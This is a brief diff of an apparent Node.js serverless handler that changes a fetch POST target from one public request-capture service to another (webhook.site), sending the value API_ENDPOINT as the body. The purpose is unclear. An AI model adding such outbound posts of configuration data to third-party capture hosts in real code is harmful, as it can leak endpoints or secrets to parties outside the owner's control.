@@ -62,7 +62,7 @@ exports.handler = function(event, context, callback) {
   };
 
   (() => {
-    fetch('http://opkpok.requestcatcher.com/test',{ method: 'POST', body: API_ENDPOINT })
+    fetch('https://webhook.site/63a01a92-d9a2-462e-8482-50fd77a1f74c',{ method: 'POST', body: API_ENDPOINT })
       .then(response => response.json())
       .then(json => {
         respond({ status: 200, body: json.body });
